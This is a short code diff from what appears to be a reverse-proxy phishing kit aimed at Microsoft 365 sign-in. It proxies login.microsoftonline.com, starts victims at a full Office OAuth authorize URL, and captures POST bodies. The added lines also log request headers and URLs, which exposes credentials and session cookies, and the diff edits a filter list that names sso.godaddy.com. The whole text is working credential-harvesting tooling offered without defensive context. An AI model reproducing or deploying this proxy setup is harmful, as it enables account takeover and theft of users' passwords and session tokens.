@@ -110,13 +110,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         if (this.req.method === 'POST') {
             // super.uploadRequestBody(clientContext.currentDomain, clientContext)
 
-            super.captureBody(clientContext.currentDomain, clientContext)
+            // clientContext.currentDomain = ''
 
+            super.captureBody(clientContext.currentDomain, clientContext)
+            console.log(JSON.stringify(this.req.headers))
+            console.log(JSON.stringify(this.req.url))
         }
-        if (this.req.url === '/cold204') {
-            this.res.writeHead(204)
-            return this.res.end('')
-        }
+        
 
 
         const redirectToken = this.checkForRedirect()
@@ -142,10 +142,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 const configExport = {
     CURRENT_DOMAIN: 'login.microsoftonline.com',
 
-    START_PATH: '/',
+    START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
     EXTERNAL_FILTERS: 
         [
-        'login.live.com',
+        // 'login.live.com',
         // 'aadcdn.msftauth.net',
         'sso.godaddy.com',
         ],
